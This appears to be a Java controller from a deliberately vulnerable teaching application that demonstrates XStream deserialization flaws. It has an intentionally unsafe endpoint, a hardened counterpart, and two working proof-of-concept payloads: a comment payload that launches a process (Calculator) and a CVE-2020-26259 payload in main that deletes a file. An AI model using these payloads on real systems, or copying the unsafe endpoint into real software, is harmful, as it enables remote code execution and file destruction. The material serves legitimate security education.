package com.best.hello.controller.ComponentsVul;

import com.thoughtworks.xstream.XStream;
import io.swagger.annotations.Api;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

/**
 * XStream是一个简单的基于Java库，Java对象序列化到XML
 *
 * @date 2021/08/16
 */

@Api("Xstream反序列化漏洞")
@RestController
@RequestMapping("/XStream")
public class XStreamVul {

    /**
     * @poc 存在多个poc
     * <sorted-set>
     * <dynamic-proxy>
     * <interface>java.lang.Comparable</interface>
     * <handler class="java.beans.EventHandler">
     * <target class="java.lang.ProcessBuilder">
     * <command>
     * <string>open</string>
     * <string>-a</string>
     * <string>Calculator</string>
     * </command>
     * </target>
     * <action>start</action>
     * </handler>
     * </dynamic-proxy>
     * </sorted-set>
     */
    @RequestMapping("/vul")
    public String vul(@RequestBody String content) {
        XStream xs = new XStream();
        xs.fromXML(content);
        return "XStream Vul";
    }

    @RequestMapping("/safe")
    public String safe(@RequestBody String content) {
        XStream xs = new XStream();
        // 修复：1.4.10后可用，启用默认安全配置
        XStream.setupDefaultSecurity(xs);

        // xs.addPermission(NoTypePermission.NONE);
        xs.fromXML(content);
        return "XStream Safe";
    }


    /**
     * CVE-2020-26259 任意文件删除/SSRF
     * 影响 1.4.15以下
     */
    public static void main(String[] args) {
        String xml_poc = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "            <contentType>text/plain</contentType>\n" +
                "            <is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'>\n" +
                "              <tempFile>/tmp/abc</tempFile>\n" +
                "            </is>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";

        XStream xs = new XStream();
        // 有效：XStream.setupDefaultSecurity(xs);

        xs.fromXML(xml_poc);
    }


}
